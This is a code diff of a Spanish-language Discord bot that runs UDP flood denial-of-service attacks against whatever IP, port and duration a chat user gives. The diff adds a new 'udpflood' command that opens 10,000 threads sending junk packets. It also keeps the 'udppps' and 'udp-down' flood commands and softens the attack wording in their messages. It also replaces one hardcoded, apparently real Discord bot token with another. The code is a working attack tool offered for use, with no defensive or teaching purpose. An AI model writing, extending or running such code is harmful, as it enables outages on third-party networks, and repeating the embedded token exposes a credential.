@@ -4,11 +4,11 @@ import socket
 import sys
 import time
 import asyncio
-from threading import Thread
+import threading
 from random import randint
 
 # Reemplaza 'TU_TOKEN_AQUÍ' con el token de tu bot de Discord
-TOKEN = 'MTM3ODA4MjUxNjMyMTE3NzY2MQ.GKKab9.flDUBw5rR7YbUSporNwaQaVueZxLDKOovpaXBk'
+TOKEN = 'MTM3ODA4MjUxNjMyMTE3NzY2MQ.G254Zc.lQI_PQYR07wuVEOgBIC7cH6fMcIthV8I1eEQj8'
 
 intents = discord.Intents.default()
 intents.message_content = True
@@ -26,16 +26,15 @@ async def ayuda(ctx):
         "- `!ayuda`\n"
         "- `!methods`"
     )
-    # Ruta a la imagen local que deseas enviar
-    image_path = '/home/jonathaneliaschavez123/BotDC/anime-demon-pictures-ydwfrvu4ub9662i0.jpg'
+    image_path = '/data/data/com.termux/files/home/storage/pictures/anime-demon-pictures-ydwfrvu4ub9662i0.jpg'
     await ctx.send(content=help_text, file=discord.File(image_path))
 
 @bot.command(name='methods')
 async def methods(ctx):
     methods_text = (
-        "**Métodos disponibles:**\n"
+        "🚀**Métodos disponibles:**🚀\n"
         "- `!udppps`\n"
-        "- `!udp-mix`\n"
+        "- `!udpflood`\n"
         "- `!udp-down`"
     )
     await ctx.send(methods_text)
@@ -58,8 +57,8 @@ class Brutalize:
         self.on = True
         self.sent = 0
         for _ in range(self.threads):
-            Thread(target=self.send, daemon=True).start()
-        Thread(target=self.info, daemon=True).start()
+            threading.Thread(target=self.send, daemon=True).start()
+        threading.Thread(target=self.info, daemon=True).start()
         end_time = time.time() + duration
         try:
             while time.time() < end_time and self.on:
@@ -104,47 +103,85 @@ class Brutalize:
 @bot.command(name='udppps')
 async def udppps(ctx, ip: str, port: int, tiempo: int):
     usage_text = (
-        "**Descripción del método `udppps`:**\n"
+        "**⚠️Descripción⚠️:**\n"
         "`!udppps <ip> <port> <time>`"
     )
     await ctx.send(usage_text)
 
-    # Ejecutar el ataque UDP PPS con los valores por defecto (size=1024, threads=5)
-    await ctx.send(f"Atacando a {ip}:{port} durante {tiempo} segundos..")
+    await ctx.send(f"Enviando a {ip}:{port} durante {tiempo} segundos")
     try:
         brute = Brutalize(ip, port, 1024, 5)
         loop = asyncio.get_running_loop()
         await loop.run_in_executor(None, brute.flood, tiempo)
-        await ctx.send(f"UDPPPS finalizado")
+        await ctx.send(f"✅UDPPPS finalizado✅")
     except Exception as e:
         await ctx.send(f"Error al ejecutar UDPPPS: {e}")
 
 @udppps.error
 async def udppps_error(ctx, error):
     if isinstance(error, commands.MissingRequiredArgument):
-        await ctx.send("Faltan argumentos. Uso correcto: `!udppps <ip> <port> <time>`\nEjemplo: `!udppps 127.0.0.1 80 10`")
+        await ctx.send("❌Uso correcto: `!udppps <ip> <port> <time>`")
     else:
         await ctx.send(f"Ocurrió un error: {error}")
 
-# ------------------ UDP-MIX ------------------
-@bot.command(name='udp-mix')
-async def udp_mix(ctx):
-    method_text = (
-        "**Descripción del método `udp-mix`:**\n"
-        "Este método está en desarrollo..."
+# ------------------ UDP-FLOOD (renombrado de UDP-Power) ------------------
+def send_packet_flood(ip, port, amplifier, stop_event):
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        s.connect((str(ip), int(port)))
+        while not stop_event.is_set():
+            s.send(b"\x99" * amplifier)
+    except Exception:
+        try:
+            s.close()
+        except:
+            pass
+
+def udp_flood_attack(ip, port, duration, amplifier):
+    loops = 10000
+    stop_event = threading.Event()
+    threads = []
+    for _ in range(loops):
+        t = threading.Thread(target=send_packet_flood, args=(ip, port, amplifier, stop_event), daemon=True)
+        t.start()
+        threads.append(t)
+    time.sleep(duration)
+    stop_event.set()
+    # Opcional: esperar que terminen los threads (no es necesario si son daemon)
+
+@bot.command(name='udpflood')
+async def udpflood(ctx, ip: str, port: int, tiempo: int):
+    usage_text = (
+        "**⚠️Descripción⚠️**\n"
+        "`!udpflood <ip> <port> <time>`"
     )
-    await ctx.send(method_text)
+    await ctx.send(usage_text)
+
+    await ctx.send(f"Enviando a {ip}:{port} durante {tiempo} segundos, size=750...")
+    try:
+        loop = asyncio.get_running_loop()
+        await loop.run_in_executor(None, udp_flood_attack, ip, port, tiempo, 750)
+        await ctx.send(f"✅UDP-FLOOD finalizado✅")
+    except Exception as e:
+        await ctx.send(f"Error al ejecutar UDP-FLOOD: {e}")
+
+@udpflood.error
+async def udpflood_error(ctx, error):
+    if isinstance(error, commands.MissingRequiredArgument):
+        await ctx.send("❌Uso correcto: `!udpflood <ip> <port> <time>`")
+    else:
+        await ctx.send(f"Ocurrió un error: {error}")
 
 # ------------------ UDP-DOWN ------------------
 @bot.command(name='udp-down')
 async def udp_down(ctx, ip: str, port: int, tiempo: int):
     usage_text = (
-        "**Descripción del método `udp-down`:**\n"
-        "Ejemplo: `!udp-down <ip> <port> <time>`\n"
+        "🚀**Descripción**🚀\n"
+        ":✅Enviando Ataque✅\n"
     )
     await ctx.send(usage_text)
 
-    # Implementación real del método UDP-DOWN (simulación)
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         payload = "\x30\x30\x30\x30\x34\x30\x30\x30".encode('utf-8')
@@ -154,15 +191,15 @@ async def udp_down(ctx, ip: str, port: int, tiempo: int):
         while time.time() < end_time:
             s.sendto(payload, (ip, port))
             sent_packets += 1
-            await asyncio.sleep(0)  # Yields control, prevents freezing
-        await ctx.send(f"UDP-DOWN finalizado {sent_packets}")
+            await asyncio.sleep(0)
+        await ctx.send(f"✅UDP-DOWN finalizado✅ {sent_packets}")
     except Exception as e:
         await ctx.send(f"Error al ejecutar UDP-DOWN: {e}")
 
 @udp_down.error
 async def udp_down_error(ctx, error):
     if isinstance(error, commands.MissingRequiredArgument):
-        await ctx.send("Faltan argumentos. Uso correcto: `!udp-down <ip> <port> <time>`\nEjemplo: `!udp-down 127.0.0.1 80 10`")
+        await ctx.send("❌Uso correcto: `!udp-down <ip> <port> <time>`")
     else:
         await ctx.send(f"Ocurrió un error: {error}")
 
